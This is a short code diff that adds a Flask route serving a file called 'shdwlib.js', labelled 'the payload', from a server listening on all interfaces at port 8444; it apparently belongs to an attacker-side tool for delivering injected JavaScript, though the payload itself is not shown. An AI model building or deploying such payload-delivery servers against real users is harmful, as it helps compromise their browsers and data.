@@ -49,5 +49,24 @@ def printHeader():
 
 
 
+#***************************************************************************
+# Support Functions
+
+
+
+#***************************************************************************
+# API Endpoints
+
+# Send a copy of the payload
+@app.route('/lib/shdwlib.js', methods=['GET'])
+def sendPayload():
+    with open('./shdwlib.js', 'rb') as file:
+        return file.read(), 200
+
+
+
+
+
 if __name__ == '__main__':
     printHeader()
+    app.run(debug=False, host='0.0.0.0', port=8444)
